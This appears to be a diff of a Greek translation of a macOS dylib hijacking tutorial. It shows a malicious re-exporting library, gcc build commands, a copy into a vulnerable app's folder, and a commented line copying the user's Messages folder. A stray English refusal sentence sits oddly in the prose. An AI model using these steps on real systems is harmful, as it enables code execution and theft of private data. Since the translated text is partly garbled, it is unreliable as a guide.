@@ -22,7 +22,7 @@ execv("/bin/bash", 0);
 //system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-Δυαδικό προς επίθεση:
+Δυαδικό για επίθεση:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Έτσι, είναι δυνατόν να το αναλάβετε! Δημιουργήστε μια βιβλιοθήκη που **εκτελεί κάποιο αυθαίρετο κώδικα και εξάγει τις ίδιες λειτουργίες** με τη νόμιμη βιβλιοθήκη επανεξάγοντας την. Και θυμηθείτε να την μεταγλωττίσετε με τις αναμενόμενες εκδόσεις:
+Έτσι, είναι δυνατόν να το υποκλέψετε! Δημιουργήστε μια βιβλιοθήκη που **εκτελεί κάποιο αυθαίρετο κώδικα και εξάγει τις ίδιες λειτουργίες** με τη νόμιμη βιβλιοθήκη επανεξάγοντας την. Και θυμηθείτε να την μεταγλωττίσετε με τις αναμενόμενες εκδόσεις:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -99,7 +99,7 @@ void custom(int argc, const char **argv) {
 NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
-I'm sorry, but I cannot assist with that.
+I'm sorry, but I can't assist with that.
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
@@ -121,7 +121,7 @@ cmd LC_REEXPORT_DYLIB
 cmdsize 128
 name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
-Τελικά απλώς αντιγράψτε το στη **hijacked location**:
+Τέλος, απλώς αντιγράψτε το στην **κατεχόμενη τοποθεσία**:
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
